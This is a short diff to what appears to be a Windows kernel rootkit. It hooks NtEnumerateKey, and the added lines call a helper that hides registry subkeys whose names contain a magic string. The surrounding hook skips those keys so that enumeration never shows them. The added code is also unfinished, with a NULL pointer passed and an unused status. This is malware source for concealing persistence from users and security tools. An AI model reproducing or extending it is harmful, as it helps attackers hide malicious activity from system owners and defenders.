@@ -63,6 +63,11 @@ NTSTATUS DetourNtEnumerateKey(
 			
 			// if the key contains 'hideme', return ANOTHER CALL of NtEnumerateKey
 			if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
+				kprintf("[+] infinityhook: Should hit RegistryKeyHideInformation\n");
+				INT32 HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
+				PINT32 OkSubkeyIndexesPtr = NULL;
+				NTSTATUS status = RegistryKeyHideInformation(KeyHandle, &HideSubkeyIndexesCount, &OkSubkeyIndexesCount, OkSubkeyIndexesPtr);
+
 				return OriginalNtEnumerateKey(KeyHandle, Index + 1, KeyInformationClass, KeyInformation, Length, ResultLength);
 			}
 
